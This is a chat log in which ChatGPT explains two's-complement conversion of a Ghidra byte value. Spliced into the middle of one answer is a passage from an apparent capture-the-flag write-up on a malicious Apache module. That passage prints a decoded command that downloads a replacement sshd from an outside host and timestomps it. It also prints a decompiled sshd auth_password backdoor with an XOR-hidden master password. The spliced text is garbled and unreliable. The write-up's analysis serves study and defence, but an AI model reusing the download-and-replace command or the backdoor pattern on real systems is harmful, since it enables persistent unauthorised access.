


This value seems weird?
  backdoor[30] = -0x5b;

ChatGPT
Yes, you're right. The line backdoor[30] = -0x5b; is setting the value at index 30 of the backdoor array to the negative of hexadecimal 0x5b.

In hexadecimal, 0x5b is equivalent to 91 in decimal. The negative of 91 is -91.

So, this line is equivalent to backdoor[30] = -91;. It assigns the value -91 to the 30th element of the backdoor array.

This specific value may have a specific meaning or purpose in the context of the code, especially considering that the entire backdoor array is later manipulated using XOR operations. The exact purpose would depend on the broader context of the code and the goals of the program.

User
Wouldn't it just be 
Byte 30 shows as -0x5b in Ghidra for some reason, but this converts to a positive hex value by adding 256 (0x100) to get 0xa5. I’ve put these in 30–>1 so that I can easily copy these four and eight byte words without having to swap their byte order. But that leaves the first byte last, so I need to flip all the bytes (after I convert it from binary, or else it would swap the characters within bytes, and that’d be wrong).

ChatGPT
Yes, you are correct. I apologize for any confusion in my previous response. The representation of -0x5b in a signed 8-bit integer context would indeed be the two's complement of 0x5b, which is 0xa5 in hexadecimal.

So, in the context of a signed 8-bit integer, backdoor[30] = -0x5b; is equivalent to backdoor[30] = 0xa5;. The value 0xa5 is then used in subsequent operations or checks within the code.

Your explanation about the byte order and the need to flip the bytes after converting from binary is accurate. Depending on the endianness of the architecture, you may need to adjust the byte order to interpret the data correctly.

Thank you for pointing out the discrepancy, and I appreciate your understanding. If you have any further questions or if there's anything else I can help you with, feel free to let me know!

User
I don't get it though.. if ghidra shows it was -0x5b ... how can we convert it ourselves?
ChatGPT
I apologize for any confusion. It seems there might be a misunderstanding in the interpretation of the value. Let's clarify:

In the context of signed 8-bit integers, the hexadecimal value -0x5b is equivalent to the two's complement of 0x5b. The two's complement of a positive number is obtained by inverting all the bits and adding 1.

For example:

0x5b in binary is 01011011.
Inverting the bits results in 10100100.
Adding 1 gives 10100101, which is 0xa5 in hexadecimal.
So, the correct interpretation is that backdoor[30] is set to 0xa5, not -0x5b.

If Ghidra is showing -0x5b, there might be an issue with how the data is being interpreted or displayed in Ghidra. It's important to note that interpreting binary data can depend on the context and the data type used.

If you're unsure about the representation in Ghidra, you might want to double-check the data type, endianness, and other settings to make sure it's interpreting the data correctly. If possible, cross-reference it with other parts of the code or documentation.

User
so what if ghidra was showing -0x5c
ChatGPT
If Ghidra is showing -0x5c, you can convert it to its equivalent positive hexadecimal value by considering two's complement.

Here's how you can do it:

The positive hexadecimal value represented by 0x5c is 92.
To find the two's complement (negative value), invert all the bits of 92.
The binary representation of 92 is 01011100.
Inverting the bits gives 10100011.



mod_reader
I’ll pull a copy of mod_reader.so back to my VM and open it in Ghidra. Looking at the functions, reader_register_hooks is interesting. It just calls two other functions:

void reader_register_hooks(apr_pool_t *p)

{
  ap_hook_handler(reader_handler,0,0,10);
  ap_hook_post_config(hook_post_config,0,0,0);
  return;
}
ap_hook_handler registers the function to handle requests. The 10 at the end is ARP_HOOK_MIDDLE, which says that this hook should run somewhere, but isn’t specific about being at the start or end. reader_handler doesn’t seem to do anything interesting.

ap_hook_post_config will register the function hook_post_config to run after each start of the service, and it’s more interesting:

int hook_post_config(apr_pool_t *pconf,apr_pool_t *plog,apr_pool_t *ptemp,server_rec *s)

{
  long lVar1;
  long in_FS_OFFSET;
  char *args [4];
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  pid = fork();
  if (pid == 0) {
    b64_decode("d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0 ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk"
               ,(char *)0x0);
    args[2] = (char *)0x0;
    args[3] = (char *)0x0;
    args[0] = "/bin/bash";
    args[1] = "-c";
    execve("/bin/bash",args,(char **)0x0);
  }
  if (lVar1 == *(long *)(in_FS_OFFSET + 0x28)) {
    return 0;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
It’s doing a similar thing to the previous backdoor, forking off a call to bash, this time with a base64-encoded string. That string decodes to:

oxdf@hacky$ echo "d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk" | base64 -d
wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d `date +%Y-%m-%d -r /usr/sbin/a2enmod` /usr/sbin/sshd
With whitespace:

wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; 
touch -d `date +%Y-%m-%d -r /usr/sbin/a2enmod` /usr/sbin/sshd
It’s getting a sshd binary and setting the timestamps to match a file already on the disk. I’ll pull back a copy of that as well.

sshd
This is a much larger program, but looking through the various functions, there’s a bunch that start with auth_:

image-20220128141252543
auth_password seems like a good place to leave a backdoor, and it is:


```
int auth_password(ssh *ssh,char *password)

{
  Authctxt *ctxt;
  passwd *ppVar1;
  int iVar2;
  uint ret;
  byte *pbVar3;
  byte *pbVar4;
  size_t sVar5;
  byte bVar6;
  int iVar7;
  long in_FS_OFFSET;
  char backdoor [31];
  byte local_39 [9];
  long canary;
  
  bVar6 = 0xd6;
  ctxt = (Authctxt *)ssh->authctxt;
  canary = *(long *)(in_FS_OFFSET + 0x28);
  backdoor._28_2_ = 0xa9f4;
  ppVar1 = ctxt->pw;
  iVar7 = ctxt->valid;
  backdoor._24_4_ = 0xbcf0b5e3;
  backdoor._16_8_ = 0xb2d6f4a0fda0b3d6;
  backdoor[30] = -0x5b;
  backdoor._0_4_ = 0xf0e7abd6;
  backdoor._4_4_ = 0xa4b3a3f3;
  backdoor._8_4_ = 0xf7bbfdc8;
  backdoor._12_4_ = 0xfdb3d6e7;
  pbVar3 = (byte *)backdoor;
  while( true ) {
    pbVar4 = pbVar3 + 1;
    *pbVar3 = bVar6 ^ 0x96;
    if (pbVar4 == local_39) break;
    bVar6 = *pbVar4;
    pbVar3 = pbVar4;
  }
  iVar2 = strcmp(password,backdoor);
  ret = 1;
  if (iVar2 != 0) {
    sVar5 = strlen(password);
    ret = 0;
    if (sVar5 < 0x401) {
      if ((ppVar1->pw_uid == 0) && (options.permit_root_login != 3)) {
        iVar7 = 0;
      }
      if ((*password != '\0') ||
         (ret = options.permit_empty_passwd, options.permit_empty_passwd != 0)) {
        if (auth_password::expire_checked == 0) {
          auth_password::expire_checked = 1;
          iVar2 = auth_shadow_pwexpired(ctxt);
          if (iVar2 != 0) {
            ctxt->force_pwchange = 1;
          }
        }
        iVar2 = sys_auth_passwd(ssh,password);
        if (ctxt->force_pwchange != 0) {
          auth_restrict_session(ssh);
        }
        ret = (uint)(iVar2 != 0 && iVar7 != 0);
      }
    }
  }
  if (canary == *(long *)(in_FS_OFFSET + 0x28)) {
    return ret;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}

```

There’s a buffer called backdoor that’s set and then XORed by 0x96. Then the password is compared to that value, and if so, the return value is set to one, and the rest of the function is skipped.

Recover Password
The most challenging part here is to get all the bytes in the right order. There are 31 bytes set here, and the byte order such that the first byte is the last two characters in each word. I’ve labeled some of the bytes 0 to 30 in red in this image:


I’ll combine all those to make this string, using a Python terminal starting with the byte I’ve labeled 30 going down to 0:

oxdf@hacky$ python3
Python 3.8.10 (default, Mar 15 2022, 12:22:08) 
[GCC 9.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> backdoor_str = 'a5a9f4bcf0b5e3b2d6f4a0fda0b3d6fdb3d6e7f7bbfdc8a4b3a3f3f0e7abd6'
Byte 30 shows as -0x5b in Ghidra for some reason, but this converts to a positive hex value by adding 256 (0x100) to get 0xa5. I’ve put these in 30–>1 so that I can easily copy these four and eight byte words without having to swap their byte order. But that leaves the first byte last, so I need to flip all the bytes (after I convert it from binary, or else it would swap the characters within bytes, and that’d be wrong).

>>> import binascii
>>> backdoor = binascii.unhexlify(backdoor_str)[::-1]
All that remains is to loop over each byte and xor it with 0x96, and then convert back to a character and print:
Adding 1 to the inverted bits results in 10100100, which is 0xa4 in hexadecimal.
Therefore, in the context of an 8-bit signed integer, if Ghidra is showing -0x5c, the equivalent positive hexadecimal value would be 0xa4.
